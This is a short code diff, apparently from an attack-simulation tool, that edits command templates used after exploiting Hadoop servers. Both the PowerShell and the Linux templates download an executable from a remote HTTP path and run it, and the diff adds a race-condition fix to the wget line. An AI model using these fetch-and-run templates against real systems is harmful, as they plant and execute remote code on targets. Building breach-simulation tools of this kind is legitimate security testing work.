@@ -46,16 +46,19 @@ CHECK_COMMAND = "echo %s" % ID_STRING
 # Architecture checking commands
 GET_ARCH_WINDOWS = "wmic os get osarchitecture"  # can't remove, powershell exploiter uses
 
-# All in one commands (upload, change permissions, run)
 HADOOP_WINDOWS_COMMAND = (
     "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { "
     "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; "
     " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) "
     '{& %(monkey_path)s %(monkey_type)s %(parameters)s }  "'
 )
+# The hadoop server may request another monkey executable
+# which results with a zero-size file which needs to be removed,
+# this can lead to a race condition when the command is run twice
+# so we are adding a 5 seconds sleep to prevent that
 HADOOP_LINUX_COMMAND = (
-    "! [ -f %(monkey_path)s ] "
-    "&& wget -O %(monkey_path)s %(http_path)s "
+    "wget --no-clobber -O %(monkey_path)s %(http_path)s "
+    "|| sleep 5 && ( ( ! [ -s %(monkey_path)s ] ) && rm %(monkey_path)s ) "
     "; chmod +x %(monkey_path)s "
     "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"
 )
